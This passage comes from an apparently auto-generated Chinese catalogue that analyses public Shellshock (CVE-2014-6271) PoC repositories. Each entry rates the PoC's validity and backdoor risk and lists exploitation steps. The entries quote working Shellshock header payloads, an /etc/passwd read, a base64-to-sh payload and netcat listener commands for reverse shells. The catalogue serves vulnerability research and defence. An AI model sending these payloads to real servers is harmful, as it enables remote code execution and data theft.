    *   **OpenSSH的ForceCommand功能：** 攻击者可以通过SSH连接，利用ForceCommand功能执行命令，并将恶意环境变量传递给Bash。
    *   **DHCP客户端：** 在某些情况下，DHCP客户端会执行脚本，并将DHCP服务器提供的环境变量传递给Bash。
3.  **Bash执行包含恶意代码的环境变量。** 当Bash遇到函数定义后的trailing strings时，会将其作为命令执行，从而导致远程代码执行。

例如，通过CGI脚本利用该漏洞的Payload可能如下所示：

```
GET /cgi-bin/test.cgi HTTP/1.1
User-Agent: () { :; }; /usr/bin/env
Host: target.com
```

该请求会将`User-Agent`头设置为包含恶意代码的环境变量，当Web服务器调用`test.cgi`脚本时，`/usr/bin/env`命令会被执行。

**项目地址:** [cved-sources/cve-2014-6271](https://github.com/cved-sources/cve-2014-6271)

**漏洞详情:** [CVE-2014-6271](https://nvd.nist.gov/vuln/detail/CVE-2014-6271)

---

## POC #19

**来源**: [CVE-2014-6271-cyberharsh_Shellbash-CVE-2014-6271.md](../2014/CVE-2014-6271-cyberharsh_Shellbash-CVE-2014-6271.md)

## CVE-2014-6271 Shellshock

**漏洞编号:** CVE-2014-6271

**漏洞类型:** 远程代码执行

**影响应用:** GNU Bash

**危害等级:** 高危，可能导致远程代码执行和系统控制

**影响版本:** through 4.3

**利用条件:** 目标系统使用CGI，OpenSSH等方式，且Bash版本在受影响范围内

**POC 可用性:** 是

**投毒风险:** 1%

## 详情

CVE-2014-6271，又名Shellshock，是一个存在于GNU Bash中的高危漏洞。该漏洞允许攻击者通过特制的、包含恶意代码的环境变量，在目标系统上执行任意命令。漏洞利用的方式是：通过将包含函数定义的恶意字符串作为环境变量的值传递给Bash，Bash在解析这些环境变量时，会错误地执行函数定义后面的命令。漏洞利用代码分析：提供的Dockerfile构建了一个包含易受攻击的Bash版本（4.3.0）和Apache HTTP Server的Docker镜像。`safe.cgi`和`victim.cgi`脚本被添加到`/var/www/html/`目录下。`victim.cgi`使用易受攻击的Bash版本，而`safe.cgi` 使用修复后的版本（但提供的代码中，两个cgi都一样，都是直接输出helloworld）。攻击者可以通过修改User-Agent头，或者通过其他CGI变量传递恶意代码，从而在服务器上执行命令。根据readme.md的描述，向victim.cgi发送包含payload的User-Agent，可以触发漏洞。例如：

`User-Agent: () { foo; }; echo Content-Type: text/plain; echo; /usr/bin/id`

该漏洞利用的有效性较高，因为漏洞原理简单，且影响范围广泛。**投毒风险评估：**代码仓库中可能存在作者隐藏的恶意代码的风险较低，这里评估为1%。主要原因是：Dockerfile比较简单，只是构建了一个包含特定版本Bash和Apache HTTP Server的镜像，没有发现明显的后门代码。safe.cgi和victim.cgi 脚本本身也比较简单，只是输出“Hello world”，并没有包含任何可疑的逻辑。flagA文件只是一个标记文件，不包含任何可执行代码。虽然不能完全排除作者在镜像构建过程中隐藏恶意代码的可能性，但从目前的代码来看，这种可能性很小。

**利用方式总结：**

1.  **确定目标系统使用的Bash版本在受影响范围内（<=4.3）。**
2.  **找到一个可以设置环境变量的入口点，例如CGI脚本、OpenSSH的ForceCommand等。**
3.  **构造包含恶意代码的环境变量，例如：`() { :; }; /usr/bin/id`。**
4.  **将该环境变量传递给Bash。**
5.  **Bash解析环境变量时，会执行恶意代码。**

利用代码中的`victim.cgi`脚本是一个CGI入口点，攻击者可以通过修改HTTP请求头（例如User-Agent）来设置环境变量，从而触发漏洞。

**项目地址:** [cyberharsh/Shellbash-CVE-2014-6271](https://github.com/cyberharsh/Shellbash-CVE-2014-6271)

**漏洞详情:** [CVE-2014-6271](https://nvd.nist.gov/vuln/detail/CVE-2014-6271)

---

## POC #20

**来源**: [CVE-2014-6271-hadrian3689_shellshock.md](../2014/CVE-2014-6271-hadrian3689_shellshock.md)

## CVE-2014-6271 Shellshock

**漏洞编号:** CVE-2014-6271

**漏洞类型:** 远程代码执行

**影响应用:** GNU Bash

**危害等级:** 高危，可能导致远程代码执行，系统完全控制

**影响版本:** Bash <= 4.3

**利用条件:** 目标系统存在CGI脚本或通过OpenSSH等方式设置环境变量

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2014-6271，也被称为Shellshock，是一个存在于GNU Bash中的远程代码执行漏洞。该漏洞允许攻击者通过构造包含恶意代码的环境变量来执行任意命令。

**有效性：**
提供的POC代码是有效的。该Python脚本利用Shellshock漏洞通过User-Agent头注入恶意Bash代码，从而在目标系统上执行命令，可以实现反向shell或伪交互式shell。

**投毒风险：**
该脚本主要功能是利用Shellshock漏洞，但代码中存在一定的投毒风险：
*   **风险点：** `shellshock.py`中的payload构造部分，即`payload = "() { :;}; echo; /bin/bash -c 'echo " + cmd + " | base64 -d | sh'"`。虽然脚本本身的目标是实现反向shell，但是攻击者可以修改`cmd`变量的内容，插入恶意的、非反向shell的代码，进行破坏或植入后门。
*   **缓解措施：** 使用者应仔细审查脚本内容，尤其是`cmd`变量的赋值部分，确保脚本执行的是预期操作，并且来自可信来源。
*   **投毒风险百分比:** 10%。主要是脚本中自定义命令的灵活性可能被滥用，并非恶意代码。大部分代码功能清晰，实现的是漏洞利用逻辑。

**利用方式：**
1.  **漏洞原理：** Bash在解析环境变量时，如果环境变量的值包含函数定义，Bash会执行函数定义后面的字符串。攻击者可以利用这个特性，在环境变量中注入恶意代码。
2.  **攻击方法：**
    *   **通过HTTP User-Agent头：** POC脚本通过修改HTTP请求的User-Agent头，将包含恶意代码的环境变量传递给服务器。如果服务器使用Bash处理User-Agent头（例如，通过CGI脚本），那么恶意代码就会被执行。
    *   **反向Shell：** 脚本通过构造Bash命令，建立与攻击者机器的反向TCP连接，从而获得目标系统的shell访问权限。
    *   **正向Shell (防火墙绕过)：** 脚本创建一个命名管道(FIFO)用于输入和输出，攻击者通过HTTP请求向管道写入命令，并读取管道的输出来实现交互式shell。这种方式可以绕过一些防火墙的限制。
3.  **利用条件：**
    *   目标系统运行着存在Shellshock漏洞的Bash版本。
    *   存在可以传递环境变量给Bash的途径，例如CGI脚本、OpenSSH的ForceCommand等。
    *   如果使用反向shell，目标系统需要能够连接到攻击者的机器。

**项目地址:** [hadrian3689/shellshock](https://github.com/hadrian3689/shellshock)

**漏洞详情:** [CVE-2014-6271](https://nvd.nist.gov/vuln/detail/CVE-2014-6271)

---

## POC #21

**来源**: [CVE-2014-6271-hanmin0512_CVE-2014-6271_pwnable.md](../2014/CVE-2014-6271-hanmin0512_CVE-2014-6271_pwnable.md)

## CVE-2014-6271 Shellshock

**漏洞编号:** CVE-2014-6271

**漏洞类型:** 命令注入

**影响应用:** Bash

**危害等级:** 高危，可导致远程代码执行

**影响版本:** <= 4.3

**利用条件:** 需要目标系统存在CGI脚本、OpenSSH等利用入口，允许设置环境变量

**POC 可用性:** 是

**投毒风险:** 0%

## 详情

CVE-2014-6271，又名Shellshock，是一个存在于GNU Bash中的命令注入漏洞。攻击者可以构造包含恶意代码的环境变量，当Bash shell执行时，会将恶意代码一并执行，从而达到远程命令执行的目的。

**有效性：**

提供的POC代码是有效的，它演示了利用Shellshock漏洞的基本原理，即通过设置包含恶意代码的环境变量来执行任意命令。shellshock.c 文件通过提权后执行 bash 命令来证明改漏洞的利用。

**投毒风险：**

代码仓库中未发现明显的投毒代码。shellshock.c 只是简单的提权后执行了 bash 命令。

**利用方式：**

1.  **漏洞原理：** Bash在处理环境变量时，如果环境变量的值以函数定义开头，Bash会尝试解析并执行该函数定义之后的代码。如果攻击者能够控制环境变量的内容，就可以注入恶意的代码。

2.  **利用场景：**

    *   **CGI脚本：**  Web服务器在执行CGI脚本时，会将HTTP请求头中的某些字段作为环境变量传递给脚本。攻击者可以修改这些HTTP请求头，注入恶意代码。
    *   **OpenSSH：**  如果OpenSSH启用了`ForceCommand`功能，并且`ForceCommand`中使用了Bash shell，攻击者可以通过设置环境变量来执行命令。
    *   **DHCP客户端：**  某些DHCP客户端脚本会执行Bash shell，攻击者可以通过控制DHCP服务器，设置包含恶意代码的环境变量。

3.  **利用步骤：**

    a.  确定目标系统存在Bash shell，且版本小于等于4.3。
    b.  找到一个可以通过环境变量影响Bash执行的入口（例如CGI脚本）。
    c.  构造包含恶意代码的环境变量，例如：
        `export payload='() { ignored; }; /bin/cat /etc/passwd'`
    d.  将该环境变量传递给Bash shell执行。
    e.  如果漏洞存在，`/etc/passwd`文件的内容将被输出。

**项目地址:** [hanmin0512/CVE-2014-6271_pwnable](https://github.com/hanmin0512/CVE-2014-6271_pwnable)

**漏洞详情:** [CVE-2014-6271](https://nvd.nist.gov/vuln/detail/CVE-2014-6271)

---

## POC #22

**来源**: [CVE-2014-6271-indiandragon_Shellshock-Vulnerability-Scan.md](../2014/CVE-2014-6271-indiandragon_Shellshock-Vulnerability-Scan.md)

## CVE-2014-6271 ShellShock

**漏洞编号:** CVE-2014-6271

**漏洞类型:** 远程代码执行

**影响应用:** GNU Bash

**危害等级:** 高危，允许远程攻击者执行任意代码

**影响版本:** <= 4.3

**利用条件:** 目标系统使用Bash，且攻击者能够通过环境变量影响Bash执行

**POC 可用性:** 是

**投毒风险:** 1%

## 详情

CVE-2014-6271（ShellShock）是一个存在于GNU Bash中的高危漏洞。该漏洞允许攻击者通过构造特制的包含恶意代码的环境变量，在目标系统上执行任意命令。漏洞利用方式主要依赖于Bash处理函数定义后尾随字符串的方式。攻击者可以将恶意代码嵌入到环境变量中，当Bash解析这些变量时，尾随的恶意代码会被执行。

**有效性评估：**
漏洞库信息和搜索结果均表明该漏洞真实存在且危害严重，存在大量可利用的场景。利用代码库中提供的文件看起来是GNU GPL许可证，本身不包含攻击代码，但实际漏洞利用需要构造特定的环境变量。

**投毒风险评估：**
提供的漏洞利用代码片段（LICENSE文件）本身不具备投毒性，它只是一个开源协议文件。投毒风险主要存在于漏洞利用的上下文和攻击者构造的恶意环境变量中。如果攻击者散布包含恶意代码的环境变量构造方法，可能会诱导用户执行有害操作。但仅分析提供的LICENSE文件，投毒风险极低，约为1%。

**利用方式分析：**
1.  **环境变量注入：** 攻击者构造包含恶意代码的环境变量，例如：`(){ :; }; /bin/eject`。
2.  **触发Bash解析：** 寻找能够触发Bash解析这些环境变量的入口点。常见的入口点包括：
    *   OpenSSH的`ForceCommand`。
    *   Apache HTTP Server的`mod_cgi`和`mod_cgid`模块。
    *   DHCP客户端脚本。
    *   其他任何跨越权限边界并设置环境变量的Bash执行场景。
3.  **远程代码执行：** 当Bash解析包含恶意代码的环境变量时，嵌入的命令会被执行，导致远程代码执行。

根据搜索结果，该漏洞已存在多年，但由于其影响范围广泛，仍然值得关注。应及时更新Bash版本，并检查系统配置，避免受到攻击。

**项目地址:** [indiandragon/Shellshock-Vulnerability-Scan](https://github.com/indiandragon/Shellshock-Vulnerability-Scan)

**漏洞详情:** [CVE-2014-6271](https://nvd.nist.gov/vuln/detail/CVE-2014-6271)

---

## POC #23

**来源**: [CVE-2014-6271-knightc0de_Shellshock_vuln_Exploit.md](../2014/CVE-2014-6271-knightc0de_Shellshock_vuln_Exploit.md)

## CVE-2014-6271 Shellshock

**漏洞编号:** CVE-2014-6271

**漏洞类型:** 远程代码执行

**影响应用:** GNU Bash

**危害等级:** 高危，可能导致远程代码执行，系统权限获取

**影响版本:** <= 4.3

**利用条件:** 目标系统使用Bash作为shell，且存在CGI脚本或允许通过环境变量传递命令

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2014-6271，又名Shellshock，是一个存在于GNU Bash中的高危漏洞。该漏洞允许攻击者通过构造特制的包含恶意代码的环境变量，在目标系统上执行任意命令。当Bash shell处理这些环境变量时，会在函数定义后执行嵌入的命令，从而导致安全风险。

**有效性：**

提供的PoC代码是有效的，它通过`pwn`库和`requests`库实现漏洞利用。该脚本通过构造包含恶意Bash代码的HTTP请求头（User-Agent, Cookie, Referer）发送到目标服务器，如果目标服务器存在CGI脚本且使用存在漏洞的Bash版本，则会执行恶意代码，并反弹shell到攻击者指定的IP地址和端口。

**投毒风险：**

该仓库中存在一定的投毒风险，风险评估为10%。虽然作者提供了免责声明，并且主要代码逻辑是为了利用Shellshock漏洞，但仍然存在潜在的后门或恶意修改的可能性，尽管看起来相对较低：
*   **依赖风险**: 依赖`pwn`和`requests`库，如果这些库被篡改，可能引入恶意代码。
*   **Payload定制**: Payload的构造方式可能被修改，引入额外的恶意行为。

**利用方式：**

1.  **确定目标：** 寻找运行CGI脚本的web服务器，或者其他任何可能通过环境变量传递命令给Bash的应用程序。
2.  **构造Payload：** 构造一个包含恶意Bash代码的环境变量，例如：`() { :;}; /bin/bash -c 'command'`。
3.  **传递Payload：** 通过HTTP请求头（User-Agent, Cookie, Referer）或者其他方式将payload作为环境变量传递给目标系统。
4.  **触发漏洞：** 当Bash shell处理包含恶意代码的环境变量时，会执行嵌入的命令。
5.  **获取权限：** 利用反弹shell或其他方式获取目标系统的控制权。

**项目地址:** [knightc0de/Shellshock_vuln_Exploit](https://github.com/knightc0de/Shellshock_vuln_Exploit)

**漏洞详情:** [CVE-2014-6271](https://nvd.nist.gov/vuln/detail/CVE-2014-6271)

---

## POC #24

**来源**: [CVE-2014-6271-mochizuki875_CVE-2014-6271-Apache-Debian.md](../2014/CVE-2014-6271-mochizuki875_CVE-2014-6271-Apache-Debian.md)

## CVE-2014-6271-Apache-Debian Shellshock

**漏洞编号:** CVE-2014-6271

**漏洞类型:** 远程代码执行

**影响应用:** GNU Bash

**危害等级:** 高危，允许远程攻击者执行任意代码

**影响版本:** <= 4.3

**利用条件:** 需要目标系统存在CGI脚本，且Apache配置允许执行CGI脚本，并且Bash版本存在漏洞。

**POC 可用性:** 是

**投毒风险:** 5%

## 详情

CVE-2014-6271（Shellshock）是一个影响 GNU Bash 的高危漏洞。该漏洞源于 Bash 处理环境变量中函数定义后附加字符串的方式存在缺陷，允许远程攻击者通过构造特殊的环境变量来执行任意代码。

**有效性：**

根据提供的 PoC 代码（/tmp/47c4ac3d27239b789878e6360b54dc21/README.md），该 PoC 旨在演示如何在 Apache Debian 环境中利用 CVE-2014-6271 漏洞。它包含构建易受攻击的 Docker 镜像和 Kubernetes 清单的步骤，以及利用漏洞的演示。

PoC 代码的有效性通过以下事实得到证实：

*   它提供了一个明确的攻击向量：通过 `User-Agent` HTTP 头传递恶意构造的 Bash 函数定义。
*   它演示了如何获得受害容器上的 shell 访问权限。
*   它演示了如何在受害容器上修改 Web 页面内容。

因此，提供的 PoC 代码可以被认为是有效的。

**投毒风险：**

评估 PoC 代码的投毒风险表明，主要风险较低，约为 5%。

*   **高风险文件:** 位于`/tmp/47c4ac3d27239b789878e6360b54dc21/web-insecure/Dockerfile`，这个Dockerfile 用于构建包含漏洞环境，该漏洞是已知的，构建目的是用于演示验证，所以它不是投毒代码。
*   **低风险文件:** 其他文件（例如 web-secure 目录中的文件和 k8s 清单文件）似乎是良性的，并且用于设置安全的环境以进行比较或者演示。
*   **总体分析:**

虽然该存储库的目的是演示漏洞，但攻击者可能会修改 `web-insecure/Dockerfile` 以包含其他恶意软件或后门。用户在使用这些文件构建镜像时应谨慎。

**利用方式：**

利用 CVE-2014-6271 漏洞涉及以下步骤：

1.  **确定目标：**识别运行易受攻击的 Bash 版本的系统，该系统通常用于处理 Web 请求或 CGI 脚本。
2.  **构造攻击负载：**创建一个包含恶意 Bash 函数定义的特殊构造的环境变量。
3.  **传递攻击负载：**通过 HTTP 请求头（例如 `User-Agent`）或 CGI 脚本可以访问的任何其他环境变量将攻击负载传递到目标系统。
4.  **执行任意代码：**当 Bash 处理恶意环境变量时，它会执行其中嵌入的命令。

在提供的 PoC 代码中，利用方式如下：

1.  攻击者设置一个 netcat 监听器 (`nc -nvlp 5050`)。
2.  攻击者使用 curl 命令向易受攻击的 Web 服务发送一个 HTTP 请求，其中 `User-Agent` 头包含一个恶意的 Bash 函数定义。这个函数定义包含执行反向 shell 的命令，将 shell 连接到攻击者的 netcat 监听器。
3.  当 Web 服务（通常通过 CGI 脚本）执行 Bash 时，Bash 会处理恶意的 `User-Agent` 头，执行反向 shell 命令，并允许攻击者访问受害容器上的 shell。

**项目地址:** [mochizuki875/CVE-2014-6271-Apache-Debian](https://github.com/mochizuki875/CVE-2014-6271-Apache-Debian)

**漏洞详情:** [CVE-2014-6271](https://nvd.nist.gov/vuln/detail/CVE-2014-6271)

---

## POC #25

**来源**: [CVE-2014-6271-moften_CVE-2014-6271.md](../2014/CVE-2014-6271-moften_CVE-2014-6271.md)

## CVE-2014-6271 Shellshock漏洞扫描器

**漏洞编号:** CVE-2014-6271

**漏洞类型:** 远程代码执行

**影响应用:** GNU Bash

**危害等级:** 高危，允许攻击者执行任意命令

**影响版本:** <= 4.3

**利用条件:** 目标系统运行存在漏洞的Bash版本，并且存在CGI脚本或其他方式通过环境变量调用Bash。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2014-6271 (Shellshock) 漏洞允许攻击者通过特制的 Bash 环境变量执行任意命令。漏洞存在于 Bash 处理函数定义后尾随字符串的方式中。 

**有效性：**
提供的PoC代码是一个Python脚本，用于扫描目标URL是否存在Shellshock漏洞。它通过发送包含恶意payload的User-Agent头部的HTTP请求到常见的CGI脚本路径，然后检查响应中是否包含特定的字符串（'VULNERABLE-SHELLSHOCK'）来判断目标是否易受攻击。根据漏洞库信息和搜索结果，该漏洞利用方式是有效的。

**投毒风险：**
该仓库包含一个Python脚本和一个README.md文件。Python脚本的功能是发送包含特定payload的HTTP请求并检查响应。README.md文件仅包含项目名称和描述。
 *  投毒代码分析: 该python脚本主要功能是发送特定Header的请求到服务器端CGI脚本,存在以下潜在的投毒风险：
    *  **CGI脚本路径猜测：**脚本中包含一个常见的CGI脚本路径列表。如果攻击者控制了该列表，可以通过添加恶意CGI路径来欺骗扫描者，引导他们攻击不存在的或伪造的服务。
    *  **Payload修改：**虽然当前的payload是良性的，用于检测漏洞，但攻击者可能修改payload以执行恶意操作，例如上传后门或执行拒绝服务攻击。
    *  **扫描行为：** 扫描行为本身可能被目标系统检测为恶意活动，从而触发防御机制或记录扫描者的IP地址。
    *  **误报风险：**脚本依赖于特定的字符串（'VULNERABLE-SHELLSHOCK'）来判断漏洞是否存在。如果目标服务器返回包含该字符串的响应，即使实际不存在漏洞，脚本也会报告为易受攻击。修改这个字串可以导致信息泄露或者权限提升,因此可能存在一定风险。

**利用方式：**
1.  **环境变量注入：** 攻击者构造一个包含恶意代码的 Bash 函数定义的环境变量。例如：`(){ :;}; /usr/bin/id`。
2.  **触发 Bash 执行：** 通过 CGI 脚本、OpenSSH 的 ForceCommand 功能、DHCP 客户端脚本等方式，将构造的包含恶意代码的环境变量传递给 Bash。
3.  **代码执行：** 当 Bash 执行上述环境变量时，由于漏洞，尾随在函数定义后的命令会被执行，从而实现远程代码执行。

**总结：**
该PoC代码利用了Shellshock漏洞，通过环境变量注入执行任意命令。漏洞影响范围广泛，修复难度较大，危害程度高。


**项目地址:** [moften/CVE-2014-6271](https://github.com/moften/CVE-2014-6271)

**漏洞详情:** [CVE-2014-6271](https://nvd.nist.gov/vuln/detail/CVE-2014-6271)

---

## POC #26

**来源**: [CVE-2014-6271-mritunjay-k_CVE-2014-6271.md](../2014/CVE-2014-6271-mritunjay-k_CVE-2014-6271.md)

## CVE-2014-6271 ShellShock

**漏洞编号:** CVE-2014-6271

**漏洞类型:** 命令注入

**影响应用:** GNU Bash

**危害等级:** 高危，可能导致远程代码执行

**影响版本:** <= 4.3

**利用条件:** 目标系统存在CGI脚本或其他方式允许通过环境变量影响Bash执行

**POC 可用性:** 是

**投毒风险:** 0%

## 详情

CVE-2014-6271，又名ShellShock，是GNU Bash中的一个严重漏洞。攻击者可以通过构造包含恶意代码的环境变量，当这些环境变量被传递给Bash执行的进程时，会导致远程代码执行。 

**有效性：** 提供的POC代码是有效的。它通过设置`User-Agent`头来传递恶意payload。如果目标URL指向一个CGI脚本，且该脚本使用Bash处理环境变量，那么攻击者就可以执行任意命令。POC代码还包含一个检查机制，如果URL不包含`/cgi-bin/status`，它会提示用户是否要添加该路径，这增加了攻击的灵活性。

**投毒风险：** 在提供的`exploit.py`和`README.md`文件中，没有发现任何明显的投毒代码。代码逻辑清晰，目标是利用ShellShock漏洞执行命令。没有发现作者尝试引入恶意行为，例如上传恶意文件、植入后门或窃取凭据。因此，投毒风险评估为0%。

**利用方式：** 

1.  **确定目标：** 找到运行存在漏洞的Bash版本的系统，该系统需要具有某种暴露点，该暴露点允许通过环境变量注入的方式利用Bash。常见的暴露点包括CGI脚本、OpenSSH的`ForceCommand`特性以及某些DHCP客户端。
2.  **构造Payload：** 构造一个包含恶意代码的环境变量。Payload的形式通常为`() { :; }; <command>`。其中`<command>`是要执行的shell命令。
3.  **传递Payload：** 将构造的Payload作为环境变量传递给Bash。对于CGI脚本，这可以通过设置HTTP头的`User-Agent`字段来实现，如提供的POC代码所示。在其他场景中，可能需要使用其他方法来设置环境变量。
4.  **执行命令：** 当Bash执行接收到包含Payload的CGI脚本时，它会解析环境变量，触发漏洞，并执行注入的命令。
5.  **验证执行结果:** POC脚本会打印出`page`的内容,命令执行的结果将会嵌入到返回的内容中.

**综上所述：** 提供的POC代码利用了ShellShock漏洞，通过构造恶意环境变量并在目标系统上触发执行，实现了远程命令执行。虽然漏洞利用风险很高，但提供的代码本身没有发现投毒风险。

**项目地址:** [mritunjay-k/CVE-2014-6271](https://github.com/mritunjay-k/CVE-2014-6271)

**漏洞详情:** [CVE-2014-6271](https://nvd.nist.gov/vuln/detail/CVE-2014-6271)

---

## POC #27

**来源**: [CVE-2014-6271-opsxcq_exploit-CVE-2014-6271.md](../2014/CVE-2014-6271-opsxcq_exploit-CVE-2014-6271.md)

## CVE-2014-6271 ShellShock

**漏洞编号:** CVE-2014-6271

**漏洞类型:** 远程代码执行

**影响应用:** GNU Bash

**危害等级:** 高危，可能导致远程代码执行和系统控制

**影响版本:** <= 4.3

**利用条件:** 目标系统使用Bash，并且攻击者能够控制环境变量。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2014-6271，也被称为Shellshock，是一个存在于GNU Bash中的严重漏洞。该漏洞源于Bash处理环境变量中函数定义之后存在的字符串的方式。攻击者可以通过构造包含恶意代码的环境变量，当这些环境变量被Bash解析时，就能执行任意命令。

**有效性：**

根据漏洞库信息和搜索结果，CVE-2014-6271是一个经过验证的漏洞，具有较高的利用成功率。

提供的Dockerfile和相关文件构成了一个可以利用该漏洞的环境。Dockerfile设置了一个基于Debian Wheezy的Apache服务器，并部署了一个CGI脚本（vulnerable），该脚本会调用Bash。攻击者可以通过设置恶意的环境变量，然后向CGI脚本发送HTTP请求来触发漏洞，从而在服务器上执行任意命令。

**投毒风险：**

分析提供的文件，存在一定的投毒风险，约为10%。Dockerfile中从/packages安装了预先存在的软件包。虽然COPY指令本身没有明显的恶意代码，但有需要审核的地方：
1. Dockerfile 从 `/packages` 目录安装软件包，而软件包的具体内容没有给出。如果这些包由攻击者控制，可能包含恶意后门。
2. `vulnerable` CGI 脚本的内容需要仔细审查，如果脚本本身存在后门，则存在投毒风险
3. main.sh 的内容也需要确认, 是否有安装一些额外的包.

**利用方式：**

1.  **CGI脚本利用：**  最常见的利用方式是通过CGI脚本。攻击者向Web服务器发送包含恶意环境变量的HTTP请求。如果Web服务器配置为使用Bash执行CGI脚本，Bash将解析这些环境变量，导致恶意代码执行。
2.  **OpenSSH ForceCommand：**  如果OpenSSH配置了ForceCommand选项，攻击者可以通过修改环境变量来执行任意命令。
3.  **DHCP客户端：**  某些DHCP客户端在执行脚本时会设置环境变量，攻击者可以通过控制DHCP服务器来注入恶意环境变量。

总之，CVE-2014-6271是一个高危漏洞，利用简单，影响广泛。需要及时修补受影响的系统。


**项目地址:** [opsxcq/exploit-CVE-2014-6271](https://github.com/opsxcq/exploit-CVE-2014-6271)

**漏洞详情:** [CVE-2014-6271](https://nvd.nist.gov/vuln/detail/CVE-2014-6271)

---

## POC #28

**来源**: [CVE-2014-6271-rsherstnev_CVE-2014-6271.md](../2014/CVE-2014-6271-rsherstnev_CVE-2014-6271.md)

## CVE-2014-6271 - ShellShock

**漏洞编号:** CVE-2014-6271

**漏洞类型:** 远程命令执行

**影响应用:** GNU Bash

**危害等级:** 高危，可能导致远程命令执行和系统控制

**影响版本:** <= 4.3

**利用条件:** 目标系统运行Bash且存在可利用的入口点，例如CGI脚本、OpenSSH ForceCommand等。

**POC 可用性:** 是

**投毒风险:** 1%

## 详情

CVE-2014-6271，也被称为ShellShock，是一个存在于GNU Bash中的远程命令执行漏洞。该漏洞允许攻击者通过构造包含恶意代码的环境变量来执行任意命令。漏洞利用的核心在于Bash在处理函数定义后附加的字符串时存在缺陷。 

**有效性评估：**
提供的Python POC代码利用了ShellShock漏洞，其有效性较高。代码首先通过发送包含特定字符串（`HelloKittyFromN0rdeN!`）的请求头来检测目标系统是否存在漏洞。如果检测到漏洞，则进入交互式shell，允许攻击者执行任意命令。

**利用方式分析：**
1.  **漏洞检测：** POC首先发送一个HTTP请求，其中User-Agent、Referer和Cookie头都包含恶意的Bash代码。这段代码的目的是在受影响的Bash版本中执行`echo HelloKittyFromN0rdeN!`命令，从而验证漏洞是否存在。
2.  **命令执行：** 如果漏洞存在，POC会进入一个循环，允许攻击者输入命令。输入的命令会被Base64编码，然后插入到HTTP请求头中。服务器端的Bash会解码并执行这些命令。
3.  **向量：** 此POC利用HTTP请求头（User-Agent, Referer, Cookie）作为攻击向量，这些头通常会被传递给服务器并可能被Bash处理。

**投毒风险分析：**
POC代码主要功能是检测和利用ShellShock漏洞。分析代码后，发现潜在的投毒风险较低（约1%）。

*   **Base64编码：** 使用Base64编码命令可能会被认为是一种混淆手段，但这是为了确保命令在HTTP头中传输的安全性，并非恶意隐藏代码。
*   **第三方库：** POC使用了requests库，理论上存在requests库被篡改的风险。但是，requests是常用的Python库，被篡改的可能性极低。
*   **BASE64_PATH变量:** 该变量用于指定`base64`命令的路径,如果该路径被修改为恶意程序,会存在投毒风险,但原代码中该变量默认为`/usr/bin/base64`,属于正常路径. 
*   **风险点：** 主要风险集中在使用未经授权的服务器上执行任意命令，这本身就是漏洞利用的目的，而不是POC代码引入的额外风险。

**搜索引擎结果印证：**
搜索结果确认了CVE-2014-6271是ShellShock漏洞，并且是广泛存在的，有多种利用方式。这些结果也强调了该漏洞的严重性和潜在影响。

综上所述，该POC代码的有效性较高，投毒风险较低，主要用于检测和利用ShellShock漏洞，允许攻击者通过HTTP请求头在目标系统上执行任意命令。

**项目地址:** [rsherstnev/CVE-2014-6271](https://github.com/rsherstnev/CVE-2014-6271)

**漏洞详情:** [CVE-2014-6271](https://nvd.nist.gov/vuln/detail/CVE-2014-6271)

---



---

## POC #12

**来源**: [CVE-2014-6271-TheRealCiscoo_Shellshock-Exploit.md](../2014/CVE-2014-6271-TheRealCiscoo_Shellshock-Exploit.md)

## CVE-2014-6271 ShellShock

**漏洞编号:** CVE-2014-6271

**漏洞类型:** 远程命令执行

**影响应用:** GNU Bash

**危害等级:** 高危，可能导致远程代码执行

**影响版本:** 1.14 - 4.3

**利用条件:** 目标系统存在CGI脚本或其他方式允许通过HTTP Header设置环境变量，且Bash版本在受影响范围内。

**POC 可用性:** 是

**投毒风险:** 5%

## 详情

CVE-2014-6271，也被称为ShellShock，是一个存在于GNU Bash中的高危漏洞。该漏洞源于Bash处理环境变量中函数定义后附加字符串的方式存在缺陷，攻击者可以通过构造包含恶意代码的环境变量，当Bash执行相关程序时，恶意代码会被执行，从而实现远程命令执行。从漏洞库信息和搜索引擎结果来看，此漏洞影响广泛，修复不彻底，危害巨大。

**有效性：**
提供的Python POC代码利用了ShellShock漏洞。它构造了一个包含恶意Bash代码的User-Agent头，并向目标URI发送GET请求。如果目标URI是一个CGI脚本，或者其他任何调用Bash并使用该User-Agent头作为环境变量的应用程序，那么恶意的Bash代码就会被执行，从而建立反向shell。

**投毒风险：**
该仓库的投毒风险较低。虽然任何代码都可能包含恶意成分，但此POC代码相对简单，主要功能是利用已知的ShellShock漏洞。潜在的风险可能包括：

*   作者可能在反向shell的Payload中植入其他恶意命令。但通过代码审计，反向shell的Payload清晰可见，未发现隐藏的恶意代码。
*   该代码可能针对特定系统环境做了优化，如果攻击者不了解这些优化，可能会导致利用失败，或留下攻击痕迹。但这种“优化”也可以被视作一种隐蔽的攻击尝试。

综合评估，该代码存在恶意投毒的可能性较低，约为5%。这个百分比代表一种潜在的风险，需要仔细审查代码才能完全消除。

**利用方式：**
1.  **确定目标：** 找到运行受影响Bash版本的服务器，并确认存在可以通过HTTP头设置环境变量的CGI脚本或其他应用。
2.  **准备攻击环境：** 在攻击者机器上设置NetCat监听指定端口，等待反向shell连接：`ncat -lkvnp <attacker-port>`。
3.  **构造Payload：** 使用POC脚本，指定目标IP地址、URI、攻击者IP地址和监听端口。
4.  **发送请求：** 运行POC脚本，它会构造一个包含恶意代码的HTTP GET请求，并将User-Agent设置为包含恶意代码的环境变量。
5.  **利用漏洞：** 如果目标存在漏洞，Bash会执行User-Agent头中的恶意代码，建立与攻击者机器的反向shell连接。
6.  **控制目标：** 攻击者通过反向shell控制目标系统，执行任意命令。

**项目地址:** [TheRealCiscoo/Shellshock-Exploit](https://github.com/TheRealCiscoo/Shellshock-Exploit)

**漏洞详情:** [CVE-2014-6271](https://nvd.nist.gov/vuln/detail/CVE-2014-6271)

---

## POC #13

**来源**: [CVE-2014-6271-YunchoHang_CVE-2014-6271-SHELLSHOCK.md](../2014/CVE-2014-6271-YunchoHang_CVE-2014-6271-SHELLSHOCK.md)

## CVE-2014-6271 Shellshock

**漏洞编号:** CVE-2014-6271

**漏洞类型:** 命令注入

**影响应用:** GNU Bash

**危害等级:** 高危，允许远程攻击者执行任意代码

**影响版本:** 通过 4.3

**利用条件:** 目标系统使用Bash，且存在允许通过环境变量影响Bash执行的接口(例如CGI脚本)

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

